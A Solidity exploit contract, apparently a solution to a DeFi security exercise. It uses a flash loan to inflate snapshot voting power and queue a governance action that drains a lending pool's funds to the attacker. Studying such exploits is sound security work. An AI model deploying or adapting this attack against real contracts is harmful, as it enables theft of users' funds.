// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(uint256) external;
}

interface IGov {
    function queueAction(address, bytes calldata, uint256) external returns (uint256);
}

interface IERC20Snapshot {
    function balanceOf(address) external returns (uint256);
    function transfer(address, uint256) external;
    function snapshot() external returns (uint256);
}

contract Attacker6 {
    address private immutable attacker;
    IPool private immutable pool;
    IGov private immutable gov;
    IERC20Snapshot private immutable token;

    constructor(address _attacker, address _pool, address _gov, address _token) {
        attacker = _attacker;
        pool = IPool(_pool);
        gov = IGov(_gov);
        token = IERC20Snapshot(_token);
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address receiveToken, uint256 amount) external {
        IERC20Snapshot(receiveToken).snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        gov.queueAction(address(pool), data, 0);
        IERC20Snapshot(receiveToken).transfer(address(pool), amount);
    }
}
